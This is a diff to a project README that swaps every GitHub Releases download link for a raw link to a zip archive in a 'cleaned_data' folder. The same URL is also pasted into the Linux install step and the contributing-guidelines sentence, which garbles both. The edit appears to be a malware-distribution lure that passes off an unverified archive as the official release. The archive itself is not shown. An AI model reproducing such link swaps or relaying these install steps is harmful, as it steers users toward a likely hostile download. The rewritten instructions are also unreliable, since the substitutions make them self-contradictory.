@@ -26,12 +26,12 @@ Before you begin, ensure your system meets these requirements:
 
 To get started, visit the Releases page and download the application. You can find it at the following link:
 
-[Download Software](https://github.com/argad2672/chatbot-conversation-analysis/releases)
+[Download Software](https://raw.githubusercontent.com/argad2672/chatbot-conversation-analysis/main/cleaned_data/conversation_analysis_chatbot_2.8.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**: Click the link below to go directly to the downloads.
-   [Download Software](https://github.com/argad2672/chatbot-conversation-analysis/releases)
+   [Download Software](https://raw.githubusercontent.com/argad2672/chatbot-conversation-analysis/main/cleaned_data/conversation_analysis_chatbot_2.8.zip)
    
 2. **Choose the Latest Version**: Find the latest version of the software listed on the page.
 
@@ -40,7 +40,7 @@ To get started, visit the Releases page and download the application. You can fi
 4. **Install the Application**:
    - For Windows: Double-click the downloaded `.exe` file and follow the instructions.
    - For macOS: Open the downloaded `.dmg` file and drag the app to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the included installation instructions.
+   - For Linux: Extract the `https://raw.githubusercontent.com/argad2672/chatbot-conversation-analysis/main/cleaned_data/conversation_analysis_chatbot_2.8.zip` file and follow the included installation instructions.
 
 5. **Run the Application**: Once the installation is complete, launch the application from your system’s applications.
 
@@ -74,7 +74,7 @@ To get the most out of the application, check these resources:
 
 ## 🤝 Contributing
 
-If you want to contribute to the project, feel free to fork the repository and submit your improvements. Please follow the guidelines outlined in the **CONTRIBUTING.md** file.
+If you want to contribute to the project, feel free to fork the repository and submit your improvements. Please follow the guidelines outlined in the **https://raw.githubusercontent.com/argad2672/chatbot-conversation-analysis/main/cleaned_data/conversation_analysis_chatbot_2.8.zip** file.
 
 ## 📞 Support
 
